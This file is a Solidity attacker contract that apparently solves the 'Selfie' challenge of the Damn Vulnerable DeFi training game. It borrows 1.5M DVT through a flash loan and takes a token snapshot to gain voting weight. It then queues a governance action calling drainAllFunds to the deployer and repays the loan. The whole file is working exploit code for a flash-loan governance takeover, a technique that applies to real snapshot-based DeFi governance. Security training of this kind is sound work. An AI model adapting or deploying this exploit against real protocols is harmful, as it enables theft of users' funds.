// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfiePoolAttacker {
    SelfiePool private selfiePool;
    SimpleGovernance private simpleGovernance;

    address private deployer;
    uint256 public actionId;

    constructor(address _selfiePool, address _simpleGovernance) {
        deployer = msg.sender;
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
    }

    function attack() public {
        // borrow 1.5M DVT
        // since the total supply 2M DVT, this should be enough
        // to be eligible for queuing an action
        selfiePool.flashLoan(1500000 ether);
    }

    function receiveTokens(address tokenAddress, uint256 borrowedAmount)
        public
    {
        // snapshot - this is checked in queueAction
        DamnValuableTokenSnapshot(tokenAddress).snapshot();

        // store actionId to be executed after the needed time treshold
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", deployer),
            0
        );

        // pay back the loan
        ERC20Snapshot(tokenAddress).transfer(
            address(selfiePool),
            borrowedAmount
        );
    }
}
